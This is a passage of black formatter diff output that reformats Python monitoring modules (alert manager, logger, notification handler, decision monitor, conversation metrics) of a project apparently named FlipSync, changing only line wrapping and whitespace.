             end_time: Optional end time filter
-            
+
         Returns:
             List of matching active alerts
         """
         async with self._async_lock:
             alerts = list(self.active_alerts.values())
-            
+
             # Apply filters
             if level:
                 alerts = [a for a in alerts if a.level == level]
             if category:
                 alerts = [a for a in alerts if a.category == category]
@@ -669,11 +685,11 @@
                 alerts = [a for a in alerts if a.source == source]
             if start_time:
                 alerts = [a for a in alerts if a.timestamp >= start_time]
             if end_time:
                 alerts = [a for a in alerts if a.timestamp <= end_time]
-                
+
             return alerts
 
     async def get_alert_history(
         self,
         level: Optional[AlertLevel] = None,
@@ -683,25 +699,25 @@
         end_time: Optional[datetime] = None,
         limit: Optional[int] = None,
     ) -> List[Alert]:
         """
         Get alert history with optional filtering.
-        
+
         Args:
             level: Optional level filter
             category: Optional category filter
             source: Optional source filter
             start_time: Optional start time filter
             end_time: Optional end time filter
             limit: Optional limit on number of alerts
-            
+
         Returns:
             List of matching alerts from history
         """
         async with self._async_lock:
             alerts = self.alert_history.copy()
-            
+
             # Apply filters
             if level:
                 alerts = [a for a in alerts if a.level == level]
             if category:
                 alerts = [a for a in alerts if a.category == category]
@@ -709,41 +725,41 @@
                 alerts = [a for a in alerts if a.source == source]
             if start_time:
                 alerts = [a for a in alerts if a.timestamp >= start_time]
             if end_time:
                 alerts = [a for a in alerts if a.timestamp <= end_time]
-                
+
             # Sort by timestamp (newest first)
             alerts.sort(key=lambda a: a.timestamp, reverse=True)
-            
+
             # Apply limit
             if limit:
                 alerts = alerts[:limit]
-                
+
             return alerts
 
     async def acknowledge_alert(
         self, alert_id: str, user: Optional[str] = None
     ) -> bool:
         """
         Acknowledge an alert.
-        
+
         Args:
             alert_id: Alert ID
             user: User who acknowledged the alert
-            
+
         Returns:
             True if alert was acknowledged, False otherwise
         """
         async with self._async_lock:
             if alert_id in self.active_alerts:
                 alert = self.active_alerts[alert_id]
                 alert.acknowledge(user)
-                
+
                 # Remove from active alerts
                 del self.active_alerts[alert_id]
-                
+
                 self.logger.info(f"Alert {alert_id} acknowledged by {user}")
                 return True
             return False
 
     async def clear_alerts(self) -> None:
@@ -758,62 +774,66 @@
     async def export_alerts(
         self, format: str = "json", destination: Optional[Union[str, Path]] = None
     ) -> Union[str, Dict[str, Any]]:
         """
         Export alerts in various formats.
-        
+
         Args:
             format: Export format (json, html, etc.)
             destination: Optional file destination
-            
+
         Returns:
             Exported alerts as string or dictionary
         """
         async with self._async_lock:
             if format == "json":
                 # Convert alerts to JSON
                 alerts_data = [a.to_dict() for a in self.alert_history]
-                
+
                 # Write to file if destination provided
                 if destination:
                     path = Path(destination)
                     with open(path, "w") as f:
                         json.dump(alerts_data, f, indent=2)
-                
+
                 return alerts_data
             elif format == "html":
                 # Convert alerts to HTML
                 html = "<html><head><title>Alerts</title></head><body>"
                 html += "<h1>Alerts</h1>"
                 html += "<table border='1'>"
                 html += "<tr><th>Time</th><th>Level</th><th>Category</th><th>Title</th><th>Message</th></tr>"
-                
-                for alert in sorted(self.alert_history, key=lambda a: a.timestamp, reverse=True):
+
+                for alert in sorted(
+                    self.alert_history, key=lambda a: a.timestamp, reverse=True
+                ):
                     level_colors = {
                         AlertLevel.INFO: "#0000FF",  # Blue
                         AlertLevel.WARNING: "#FFA500",  # Orange
                         AlertLevel.ERROR: "#FF0000",  # Red
                         AlertLevel.CRITICAL: "#8B0000",  # Dark Red
                     }
                     color = level_colors.get(alert.level, "#000000")
-                    
+
                     html += f"<tr>"
                     html += f"<td>{alert.timestamp.strftime('%Y-%m-%d %H:%M:%S')}</td>"
-                    html += f"<td style='color: {color}'>{alert.level.value.upper()}</td>"
+                    html += (
+                        f"<td style='color: {color}'>{alert.level.value.upper()}</td>"
+                    )
                     html += f"<td>{alert.category.value}</td>"
                     html += f"<td>{alert.title}</td>"
                     html += f"<td>{alert.message}</td>"
                     html += f"</tr>"
-                
+
                 html += "</table></body></html>"
-                
+
                 # Write to file if destination provided
                 if destination:
                     path = Path(destination)
                     with open(path, "w") as f:
                         f.write(html)
-                
+
                 return html
             else:
                 raise ValueError(f"Unsupported export format: {format}")
 
 
@@ -822,11 +842,11 @@
 
 
 def get_alert_manager() -> AlertManager:
     """
     Get the singleton alert manager instance.
-    
+
     Returns:
         AlertManager instance
     """
     global _alert_manager_instance
     if _alert_manager_instance is None:
@@ -844,21 +864,21 @@
     labels: Optional[Dict[str, str]] = None,
     correlation_id: Optional[str] = None,
 ) -> Optional[Alert]:
     """
     Create and process an alert.
-    
+
     Args:
         title: Alert title
         message: Alert message
         level: Alert level
         category: Alert category
         source: Alert source
         details: Optional alert details
         labels: Optional alert labels
         correlation_id: Optional correlation ID for tracking
-        
+
     Returns:
         Created alert if processed, None if deduplicated or rate limited
     """
     return await get_alert_manager().create_alert(
         title=title,
@@ -875,11 +895,11 @@
 async def set_threshold(
     metric_name: str, warning_threshold: float, critical_threshold: float
 ) -> None:
     """
     Set thresholds for a metric.
-    
+
     Args:
         metric_name: Metric name
         warning_threshold: Warning threshold
         critical_threshold: Critical threshold
     """
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/logger.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/logger.py	2025-06-19 04:03:55.564429+00:00
@@ -49,11 +49,13 @@
 class LogFormat(Enum):
     """Log formats with different detail levels."""
 
     MINIMAL = "%(levelname)s: %(message)s"
     STANDARD = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
-    DETAILED = "%(asctime)s - %(name)s - %(levelname)s - %(pathname)s:%(lineno)d - %(message)s"
+    DETAILED = (
+        "%(asctime)s - %(name)s - %(levelname)s - %(pathname)s:%(lineno)d - %(message)s"
+    )
     JSON = "json"  # Special format for structured logging
 
 
 class LogDestination(Enum):
     """Log destinations with mobile considerations."""
@@ -159,17 +161,19 @@
             # Set up root logger
             self._setup_root_logger()
 
             # Add default sensitive patterns
             if enable_sensitive_data_redaction:
-                self.add_sensitive_patterns([
-                    r"password\s*[=:]\s*\S+",
-                    r"secret\s*[=:]\s*\S+",
-                    r"token\s*[=:]\s*\S+",
-                    r"key\s*[=:]\s*\S+",
-                    r"credential\s*[=:]\s*\S+",
-                ])
+                self.add_sensitive_patterns(
+                    [
+                        r"password\s*[=:]\s*\S+",
+                        r"secret\s*[=:]\s*\S+",
+                        r"token\s*[=:]\s*\S+",
+                        r"key\s*[=:]\s*\S+",
+                        r"credential\s*[=:]\s*\S+",
+                    ]
+                )
 
             self._initialized = True
 
     def _setup_root_logger(self):
         """Set up the root logger."""
@@ -183,13 +187,11 @@
 
         # Create formatter
         if self.log_format == LogFormat.JSON.value:
             formatter = logging.Formatter("%(message)s")
         else:
-            formatter = logging.Formatter(
-                self.log_format, datefmt=DEFAULT_DATE_FORMAT
-            )
+            formatter = logging.Formatter(self.log_format, datefmt=DEFAULT_DATE_FORMAT)
 
         # Add console handler if needed
         if self.log_destination in [LogDestination.CONSOLE, LogDestination.BOTH]:
             console_handler = logging.StreamHandler(sys.stdout)
             console_handler.setFormatter(formatter)
@@ -267,14 +269,18 @@
             patterns: List of regex patterns
         """
         with self._lock:
             for pattern in patterns:
                 # Convert pattern to capture the key part
-                modified_pattern = re.compile(r"(" + pattern.split(r"\s*[=:]\s*")[0] + r")\s*[=:]\s*\S+")
+                modified_pattern = re.compile(
+                    r"(" + pattern.split(r"\s*[=:]\s*")[0] + r")\s*[=:]\s*\S+"
+                )
                 self._sensitive_patterns.append(modified_pattern)
 
-    def set_level(self, level: Union[int, str, LogLevel], logger_name: Optional[str] = None) -> None:
+    def set_level(
+        self, level: Union[int, str, LogLevel], logger_name: Optional[str] = None
+    ) -> None:
         """
         Set the log level for a logger.
 
         Args:
             level: Log level
@@ -329,11 +335,17 @@
         """
         with self._lock:
             if context_id in self._correlation_ids:
                 del self._correlation_ids[context_id]
 
-    def log_to_memory(self, level: int, name: str, message: str, extra: Optional[Dict[str, Any]] = None) -> None:
+    def log_to_memory(
+        self,
+        level: int,
+        name: str,
+        message: str,
+        extra: Optional[Dict[str, Any]] = None,
+    ) -> None:
         """
         Log a message to memory buffer (for offline logging).
 
         Args:
             level: Log level
@@ -352,13 +364,15 @@
 
             self._memory_buffer.append(log_entry)
 
             # Trim buffer if needed
             if len(self._memory_buffer) > self._max_memory_logs:
-                self._memory_buffer = self._memory_buffer[-self._max_memory_logs:]
-
-    def flush_memory_logs(self, destination: Optional[Union[str, Path]] = None) -> List[Dict[str, Any]]:
+                self._memory_buffer = self._memory_buffer[-self._max_memory_logs :]
+
+    def flush_memory_logs(
+        self, destination: Optional[Union[str, Path]] = None
+    ) -> List[Dict[str, Any]]:
         """
         Flush memory logs to a destination.
 
         Args:
             destination: Optional file destination
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/alerts/alert_manager.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/logger.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/handler.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/handler.py	2025-06-19 04:03:55.638144+00:00
@@ -21,11 +21,11 @@
 class NotificationHandler:
     """Handles sending notifications through configured channels."""
 
     def __init__(self, config: NotificationConfig):
         """Initialize notification handler.
-        
+
         Args:
             config: Notification configuration
         """
         self.config = config
         self._last_notification: Dict[str, datetime] = {}
@@ -34,53 +34,60 @@
         self._lock = asyncio.Lock()
         self.logger = logger
 
     async def notify(self, alert: Alert) -> Optional[Notification]:
         """Send notification for an alert.
-        
+
         Args:
             alert: Alert to send notification for
-            
+
         Returns:
             Notification object if sent, None otherwise
         """
         # Check if notifications are enabled
         if not self.config.enabled:
-            self.logger.debug("Notifications are disabled, skipping alert: %s", alert.title)
+            self.logger.debug(
+                "Notifications are disabled, skipping alert: %s", alert.title
+            )
             return None
-            
+
         # Check severity threshold
         if not self.config.should_notify(alert.severity):
             self.logger.debug(
                 "Alert severity %s below threshold %s, skipping: %s",
                 alert.severity,
                 self.config.severity_threshold,
                 alert.title,
             )
             return None
-            
+
         # Check rate limiting
         async with self._lock:
             if not self._should_send(alert):
                 return None
-                
+
             # Create notification
             notification = Notification(alert=alert)
-            
+
             # Update rate limiting counters
             component_key = f"{alert.component}:{alert.severity}"
             self._last_notification[component_key] = datetime.now(timezone.utc)
-            self._notification_count[component_key] = self._notification_count.get(component_key, 0) + 1
-            
+            self._notification_count[component_key] = (
+                self._notification_count.get(component_key, 0) + 1
+            )
+
             # Check if we need to enter cooldown
             if (
                 self.config.rate_limit
-                and self._notification_count.get(component_key, 0) >= self.config.rate_limit.max_notifications
+                and self._notification_count.get(component_key, 0)
+                >= self.config.rate_limit.max_notifications
             ):
-                self._cooldown_until[component_key] = datetime.now(timezone.utc).replace(
-                    microsecond=0
-                ) + asyncio.timedelta(seconds=self.config.rate_limit.cooldown_seconds)
+                self._cooldown_until[component_key] = datetime.now(
+                    timezone.utc
+                ).replace(microsecond=0) + asyncio.timedelta(
+                    seconds=self.config.rate_limit.cooldown_seconds
+                )
                 self.logger.warning(
                     "Rate limit reached for %s:%s, entering cooldown until %s",
                     alert.component,
                     alert.severity,
                     self._cooldown_until[component_key],
@@ -95,11 +102,11 @@
                     channels_sent.append(channel)
                 except Exception as e:
                     self.logger.error(
                         "Failed to send notification to %s: %s", channel, str(e)
                     )
-                    
+
         if channels_sent:
             notification.mark_as_sent()
             self.logger.info(
                 "Sent notification for alert: %s [%s] via %s",
                 alert.title,
@@ -116,22 +123,22 @@
             notification.mark_as_failed()
             return None
 
     def _should_send(self, alert: Alert) -> bool:
         """Check if notification should be sent based on rate limit.
-        
+
         Args:
             alert: Alert to check
-            
+
         Returns:
             True if notification should be sent, False otherwise
         """
         if not self.config.rate_limit:
             return True
-            
+
         component_key = f"{alert.component}:{alert.severity}"
-        
+
         # Check if in cooldown
         cooldown_until = self._cooldown_until.get(component_key)
         if cooldown_until and datetime.now(timezone.utc) < cooldown_until:
             self.logger.debug(
                 "In cooldown for %s:%s until %s, skipping alert: %s",
@@ -139,11 +146,11 @@
                 alert.severity,
                 cooldown_until,
                 alert.title,
             )
             return False
-            
+
         # Check interval
         last_sent = self._last_notification.get(component_key)
         if last_sent:
             time_since_last = (datetime.now(timezone.utc) - last_sent).total_seconds()
             if time_since_last < self.config.rate_limit.interval_seconds:
@@ -153,23 +160,23 @@
                     alert.severity,
                     time_since_last,
                     alert.title,
                 )
                 return False
-                
+
         # Reset notification count if out of cooldown and interval
         if cooldown_until and datetime.now(timezone.utc) >= cooldown_until:
             self._notification_count[component_key] = 0
             del self._cooldown_until[component_key]
-            
+
         return True
 
     async def _send_to_channel(
         self, channel: NotificationChannel, notification: Notification
     ):
         """Send to specific notification channel.
-        
+
         Args:
             channel: Channel to send to
             notification: Notification to send
         """
         if channel == NotificationChannel.EMAIL:
@@ -181,71 +188,71 @@
         elif channel == NotificationChannel.WEBHOOK:
             await self._send_webhook(notification)
 
     async def _send_email(self, notification: Notification):
         """Send email notification.
-        
+
         Args:
             notification: Notification to send
         """
         if not self.config.channel_config.email.enabled:
             return
-            
+
         # Add recipients to notification
         notification.recipients.extend(self.config.channel_config.email.recipients)
-        
+
         # In a real implementation, this would send an email
         self.logger.debug(
             "Would send email notification to %s: %s",
             self.config.channel_config.email.recipients,
             notification.alert.title,
         )
 
     async def _send_slack(self, notification: Notification):
         """Send Slack notification.
-        
+
         Args:
             notification: Notification to send
         """
         if not self.config.channel_config.slack.enabled:
             return
-            
+
         # In a real implementation, this would send a Slack message
         self.logger.debug(
             "Would send Slack notification to %s: %s",
             self.config.channel_config.slack.channel or "default channel",
             notification.alert.title,
         )
 
     async def _send_sms(self, notification: Notification):
         """Send SMS notification.
-        
+
         Args:
             notification: Notification to send
         """
         if not self.config.channel_config.sms.enabled:
             return
-            
+
         # Add recipients to notification
         notification.recipients.extend(self.config.channel_config.sms.to_numbers)
-        
+
         # In a real implementation, this would send an SMS
         self.logger.debug(
             "Would send SMS notification to %s: %s",
             self.config.channel_config.sms.to_numbers,
             notification.alert.title,
         )
 
     async def _send_webhook(self, notification: Notification):
         """Send webhook notification.
-        
+
         Args:
             notification: Notification to send
         """
         if not self.config.channel_config.webhook.enabled:
             return
-            
+
         # In a real implementation, this would send a webhook request
         self.logger.debug(
             "Would send webhook notification to %s: %s",
             self.config.channel_config.webhook.url,
             notification.alert.title,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/handler.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/models.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/models.py	2025-06-19 04:03:55.650368+00:00
@@ -27,11 +27,11 @@
         description="Alert timestamp",
     )
     metadata: Dict[str, Any] = Field(
         default_factory=dict, description="Additional metadata"
     )
-    
+
     @field_validator("title", "message", "component")
     def validate_non_empty(cls, v):
         """Validate string fields are not empty."""
         if not v.strip():
             raise ValueError("Field cannot be empty")
@@ -39,23 +39,29 @@
 
 
 class Notification(BaseModel):
     """Notification model."""
 
-    id: str = Field(default_factory=lambda: str(uuid.uuid4()), description="Notification ID")
+    id: str = Field(
+        default_factory=lambda: str(uuid.uuid4()), description="Notification ID"
+    )
     alert: Alert = Field(..., description="Alert that triggered the notification")
-    recipients: List[str] = Field(default_factory=list, description="Notification recipients")
-    sent_at: Optional[datetime] = Field(None, description="When the notification was sent")
+    recipients: List[str] = Field(
+        default_factory=list, description="Notification recipients"
+    )
+    sent_at: Optional[datetime] = Field(
+        None, description="When the notification was sent"
+    )
     status: str = Field("pending", description="Notification status")
     delivery_attempts: int = Field(0, description="Number of delivery attempts")
     max_attempts: int = Field(3, description="Maximum number of delivery attempts")
-    
+
     def mark_as_sent(self):
         """Mark the notification as sent."""
         self.sent_at = datetime.now(timezone.utc)
         self.status = "sent"
-        
+
     def mark_as_failed(self):
         """Mark the notification as failed."""
         self.delivery_attempts += 1
         if self.delivery_attempts >= self.max_attempts:
             self.status = "failed"
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/notifications/models.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/decision/decision_monitor.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/decision/decision_monitor.py	2025-06-19 04:03:55.742120+00:00
@@ -79,11 +79,15 @@
 
             # Set up logger
             self.logger = get_logger("decision_intelligence")
 
             # Set up storage
-            self.storage_path = Path(storage_path) if storage_path else Path("logs/decision_intelligence")
+            self.storage_path = (
+                Path(storage_path)
+                if storage_path
+                else Path("logs/decision_intelligence")
+            )
             self.storage_path.mkdir(parents=True, exist_ok=True)
 
             # Store configuration
             self.enable_visualization = enable_visualization
             self.mobile_optimized = mobile_optimized
@@ -329,13 +333,11 @@
         if not self.mobile_optimized:
             await self._store_learning_event(event)
 
         return event
 
-    async def get_decision(
-        self, decision_id: str
-    ) -> Optional[Dict[str, Any]]:
+    async def get_decision(self, decision_id: str) -> Optional[Dict[str, Any]]:
         """
         Get a decision by ID.
 
         Args:
             decision_id: Decision ID
@@ -362,12 +364,14 @@
         Returns:
             List of decision data
         """
         # Filter decisions
         decisions = [
-            d for d in self._decisions.values()
-            if d.agent_id == agent_id and (decision_type is None or d.decision_type == decision_type)
+            d
+            for d in self._decisions.values()
+            if d.agent_id == agent_id
+            and (decision_type is None or d.decision_type == decision_type)
         ]
 
         # Sort by timestamp (newest first)
         decisions.sort(key=lambda d: d.timestamp, reverse=True)
 
@@ -376,11 +380,14 @@
 
         # Convert to dictionaries
         return [d.to_dict() for d in decisions]
 
     async def get_learning_events(
-        self, agent_id: Optional[str] = None, event_type: Optional[str] = None, limit: int = 100
+        self,
+        agent_id: Optional[str] = None,
+        event_type: Optional[str] = None,
+        limit: int = 100,
     ) -> List[Dict[str, Any]]:
         """
         Get learning events.
 
         Args:
@@ -405,11 +412,14 @@
 
         # Limit results
         return events[:limit]
 
     async def get_decision_metrics(
-        self, agent_id: Optional[str] = None, decision_type: Optional[str] = None, time_range_hours: int = 24
+        self,
+        agent_id: Optional[str] = None,
+        decision_type: Optional[str] = None,
+        time_range_hours: int = 24,
     ) -> Dict[str, Any]:
         """
         Get aggregated decision metrics.
 
         Args:
@@ -448,23 +458,31 @@
             outcome_counts[outcome_name] += 1
 
         # Success rate
         success_rate = 0.0
         if decisions_with_outcome:
-            successful = sum(1 for d in decisions_with_outcome if d.outcome == DecisionOutcome.SUCCESS)
+            successful = sum(
+                1
+                for d in decisions_with_outcome
+                if d.outcome == DecisionOutcome.SUCCESS
+            )
             success_rate = successful / len(decisions_with_outcome)
 
         # Average confidence
         avg_confidence = 0.0
         if decisions:
             avg_confidence = sum(d.confidence for d in decisions) / len(decisions)
 
         # Average execution time
         avg_execution_time = 0.0
-        decisions_with_execution_time = [d for d in decisions if d.execution_time is not None]
+        decisions_with_execution_time = [
+            d for d in decisions if d.execution_time is not None
+        ]
         if decisions_with_execution_time:
-            avg_execution_time = sum(d.execution_time for d in decisions_with_execution_time) / len(decisions_with_execution_time)
+            avg_execution_time = sum(
+                d.execution_time for d in decisions_with_execution_time
+            ) / len(decisions_with_execution_time)
 
         # Decision types
         decision_types = {}
         for d in decisions:
             if d.decision_type not in decision_types:
@@ -527,18 +545,20 @@
         decisions.sort(key=lambda d: d.timestamp)
 
         # Create time series data
         time_series = []
         for d in decisions:
-            time_series.append({
-                "timestamp": d.timestamp.isoformat(),
-                "decision_id": d.decision_id,
-                "agent_id": d.agent_id,
-                "decision_type": d.decision_type,
-                "confidence": d.confidence,
-                "outcome": d.outcome.name if d.outcome else None,
-            })
+            time_series.append(
+                {
+                    "timestamp": d.timestamp.isoformat(),
+                    "decision_id": d.decision_id,
+                    "agent_id": d.agent_id,
+                    "decision_type": d.decision_type,
+                    "confidence": d.confidence,
+                    "outcome": d.outcome.name if d.outcome else None,
+                }
+            )
 
         # Create visualization data
         visualization_data = {
             "metrics": metrics,
             "time_series": time_series,
@@ -588,20 +608,20 @@
         # Calculate cutoff time (30 days)
         cutoff_time = datetime.now(timezone.utc) - timedelta(days=30)
 
         # Clean up old decisions
         old_decision_ids = [
-            d_id for d_id, d in self._decisions.items()
-            if d.timestamp < cutoff_time
+            d_id for d_id, d in self._decisions.items() if d.timestamp < cutoff_time
         ]
 
         for d_id in old_decision_ids:
             del self._decisions[d_id]
 
         # Clean up old learning events
         self._learning_events = [
-            e for e in self._learning_events
+            e
+            for e in self._learning_events
             if datetime.fromisoformat(e["timestamp"]) >= cutoff_time
         ]
 
         if old_decision_ids:
             self.logger.info(f"Cleaned up {len(old_decision_ids)} old decisions")
@@ -648,20 +668,24 @@
                 json.dump(index_data, f, indent=2)
 
             # Store learning events index
             events_path = self.storage_path / "learning_events_index.json"
             with open(events_path, "w") as f:
-                json.dump([
-                    {
-                        "event_id": e["event_id"],
-                        "agent_id": e["agent_id"],
-                        "event_type": e["event_type"],
-                        "timestamp": e["timestamp"],
-                        "related_decision_id": e["related_decision_id"],
-                    }
-                    for e in self._learning_events
-                ], f, indent=2)
+                json.dump(
+                    [
+                        {
+                            "event_id": e["event_id"],
+                            "agent_id": e["agent_id"],
+                            "event_type": e["event_type"],
+                            "timestamp": e["timestamp"],
+                            "related_decision_id": e["related_decision_id"],
+                        }
+                        for e in self._learning_events
+                    ],
+                    f,
+                    indent=2,
+                )
         except Exception as e:
             self.logger.error(f"Error storing data: {e}")
 
     def _generate_html_visualization(self, data: Dict[str, Any]) -> str:
         """Generate HTML visualization for decision metrics."""
@@ -808,11 +832,11 @@
         return html
 
     async def close(self) -> None:
         """Close the monitor and clean up resources."""
         self._is_running = False
-        if hasattr(self, '_cleanup_task') and self._cleanup_task:
+        if hasattr(self, "_cleanup_task") and self._cleanup_task:
             self._cleanup_task.cancel()
             try:
                 await self._cleanup_task
             except asyncio.CancelledError:
                 pass
@@ -926,6 +950,6 @@
         agent_id=agent_id,
         event_type=event_type,
         data=data,
         related_decision_id=related_decision_id,
         metadata=metadata,
-    )
\ No newline at end of file
+    )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/decision/decision_monitor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/notifications/__init__.py	2025-06-14 20:35:30.799760+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/notifications/__init__.py	2025-06-19 04:03:55.768079+00:00
@@ -1,4 +1,5 @@
 """
 Notifications module compatibility.
 """
+
 pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/notifications/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/conversation/conversation_metrics.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/monitoring/conversation/conversation_metrics.py	2025-06-19 04:03:55.907039+00:00
@@ -82,11 +82,15 @@
 
             # Set up logger
             self.logger = get_logger("conversation_metrics")
 
             # Set up storage
-            self.storage_path = Path(storage_path) if storage_path else Path("logs/conversation_metrics")
+            self.storage_path = (
+                Path(storage_path)
+                if storage_path
+                else Path("logs/conversation_metrics")
+            )
             self.storage_path.mkdir(parents=True, exist_ok=True)
 
             # Store configuration
             self.enable_sentiment_analysis = enable_sentiment_analysis
             self.enable_dashboard_data = enable_dashboard_data
@@ -285,11 +289,13 @@
             # Update running average
             if metrics.sentiment_score is None:
                 metrics.sentiment_score = sentiment_score
             else:
                 # Weighted average (more weight to recent scores)
-                metrics.sentiment_score = 0.7 * sentiment_score + 0.3 * metrics.sentiment_score
+                metrics.sentiment_score = (
+                    0.7 * sentiment_score + 0.3 * metrics.sentiment_score
+                )
 
         # Log turn
         self.logger.debug(
             f"User turn in conversation {conversation_id}",
             extra={
@@ -428,37 +434,52 @@
         # Calculate time cutoff
         cutoff_time = datetime.now(timezone.utc) - timedelta(hours=time_range_hours)
 
         # Filter conversations by agent and time
         agent_conversations = [
-            c for c in self._conversations.values()
+            c
+            for c in self._conversations.values()
             if c.agent_id == agent_id and c.start_time >= cutoff_time
         ]
 
         # Calculate metrics
         total_conversations = len(agent_conversations)
-        completed_conversations = sum(1 for c in agent_conversations if c.status == ConversationStatus.COMPLETED)
-        abandoned_conversations = sum(1 for c in agent_conversations if c.status == ConversationStatus.ABANDONED)
+        completed_conversations = sum(
+            1 for c in agent_conversations if c.status == ConversationStatus.COMPLETED
+        )
+        abandoned_conversations = sum(
+            1 for c in agent_conversations if c.status == ConversationStatus.ABANDONED
+        )
 
         # Calculate averages
         avg_duration = 0.0
         avg_turns = 0.0
         avg_satisfaction = 0.0
 
         if total_conversations > 0:
             # Duration (only for completed conversations)
-            completed_with_duration = [c for c in agent_conversations if c.status == ConversationStatus.COMPLETED and c.duration is not None]
+            completed_with_duration = [
+                c
+                for c in agent_conversations
+                if c.status == ConversationStatus.COMPLETED and c.duration is not None
+            ]
             if completed_with_duration:
-                avg_duration = sum(c.duration for c in completed_with_duration) / len(completed_with_duration)
+                avg_duration = sum(c.duration for c in completed_with_duration) / len(
+                    completed_with_duration
+                )
 
             # Turns
             avg_turns = sum(c.turns for c in agent_conversations) / total_conversations
 
             # Satisfaction
-            conversations_with_satisfaction = [c for c in agent_conversations if c.satisfaction_score is not None]
+            conversations_with_satisfaction = [
+                c for c in agent_conversations if c.satisfaction_score is not None
+            ]
             if conversations_with_satisfaction:
-                avg_satisfaction = sum(c.satisfaction_score for c in conversations_with_satisfaction) / len(conversations_with_satisfaction)
+                avg_satisfaction = sum(
+                    c.satisfaction_score for c in conversations_with_satisfaction
+                ) / len(conversations_with_satisfaction)
 
         # Collect all intents and responses
         all_intents = {}
         all_responses = {}
 
@@ -480,16 +501,24 @@
             "agent_id": agent_id,
             "time_range_hours": time_range_hours,
             "total_conversations": total_conversations,
             "completed_conversations": completed_conversations,
             "abandoned_conversations": abandoned_conversations,
-            "completion_rate": completed_conversations / total_conversations if total_conversations > 0 else 0.0,
+            "completion_rate": (
+                completed_conversations / total_conversations
+                if total_conversations > 0
+                else 0.0
+            ),
             "avg_duration": avg_duration,
             "avg_turns": avg_turns,
             "avg_satisfaction": avg_satisfaction,
-            "top_intents": dict(sorted(all_intents.items(), key=lambda x: x[1], reverse=True)[:10]),
-            "top_responses": dict(sorted(all_responses.items(), key=lambda x: x[1], reverse=True)[:10]),
+            "top_intents": dict(
+                sorted(all_intents.items(), key=lambda x: x[1], reverse=True)[:10]
+            ),
+            "top_responses": dict(
+                sorted(all_responses.items(), key=lambda x: x[1], reverse=True)[:10]
+            ),
         }
 
     async def export_dashboard_data(
         self,
         format: str = "json",
@@ -513,12 +542,11 @@
         # Calculate time cutoff
         cutoff_time = datetime.now(timezone.utc) - timedelta(hours=time_range_hours)
 
         # Filter conversations by time
         recent_conversations = [
-            c for c in self._conversations.values()
-            if c.start_time >= cutoff_time
+            c for c in self._conversations.values() if c.start_time >= cutoff_time
         ]
 
         # Group by agent
         agents = {}
         for c in recent_conversations:
@@ -528,31 +556,46 @@
 
         # Calculate agent metrics
         agent_metrics = {}
         for agent_id, conversations in agents.items():
             total = len(conversations)
-            completed = sum(1 for c in conversations if c.status == ConversationStatus.COMPLETED)
-            abandoned = sum(1 for c in conversations if c.status == ConversationStatus.ABANDONED)
+            completed = sum(
+                1 for c in conversations if c.status == ConversationStatus.COMPLETED
+            )
+            abandoned = sum(
+                1 for c in conversations if c.status == ConversationStatus.ABANDONED
+            )
 
             # Calculate averages
             avg_duration = 0.0
             avg_turns = 0.0
             avg_satisfaction = 0.0
 
             if total > 0:
                 # Duration (only for completed conversations)
-                completed_with_duration = [c for c in conversations if c.status == ConversationStatus.COMPLETED and c.duration is not None]
+                completed_with_duration = [
+                    c
+                    for c in conversations
+                    if c.status == ConversationStatus.COMPLETED
+                    and c.duration is not None
+                ]
                 if completed_with_duration:
-                    avg_duration = sum(c.duration for c in completed_with_duration) / len(completed_with_duration)
+                    avg_duration = sum(
+                        c.duration for c in completed_with_duration
+                    ) / len(completed_with_duration)
 
                 # Turns
                 avg_turns = sum(c.turns for c in conversations) / total
 
                 # Satisfaction
-                conversations_with_satisfaction = [c for c in conversations if c.satisfaction_score is not None]
+                conversations_with_satisfaction = [
+                    c for c in conversations if c.satisfaction_score is not None
+                ]
                 if conversations_with_satisfaction:
-                    avg_satisfaction = sum(c.satisfaction_score for c in conversations_with_satisfaction) / len(conversations_with_satisfaction)
+                    avg_satisfaction = sum(
+                        c.satisfaction_score for c in conversations_with_satisfaction
+                    ) / len(conversations_with_satisfaction)
 
             agent_metrics[agent_id] = {
                 "total": total,
                 "completed": completed,
                 "abandoned": abandoned,
@@ -567,14 +610,30 @@
             "generated_at": datetime.now(timezone.utc).isoformat(),
             "time_range_hours": time_range_hours,
             "total_conversations": len(recent_conversations),
             "agent_metrics": agent_metrics,
             "conversation_status": {
-                "completed": sum(1 for c in recent_conversations if c.status == ConversationStatus.COMPLETED),
-                "active": sum(1 for c in recent_conversations if c.status == ConversationStatus.ACTIVE),
-                "abandoned": sum(1 for c in recent_conversations if c.status == ConversationStatus.ABANDONED),
-                "error": sum(1 for c in recent_conversations if c.status == ConversationStatus.ERROR),
+                "completed": sum(
+                    1
+                    for c in recent_conversations
+                    if c.status == ConversationStatus.COMPLETED
+                ),
+                "active": sum(
+                    1
+                    for c in recent_conversations
+                    if c.status == ConversationStatus.ACTIVE
+                ),
+                "abandoned": sum(
+                    1
+                    for c in recent_conversations
+                    if c.status == ConversationStatus.ABANDONED
+                ),
+                "error": sum(
+                    1
+                    for c in recent_conversations
+                    if c.status == ConversationStatus.ERROR
+                ),
             },
         }
 
         # Format output
         if format == "json":
@@ -619,11 +678,12 @@
         # Calculate cutoff time (30 days)
         cutoff_time = datetime.now(timezone.utc) - timedelta(days=30)
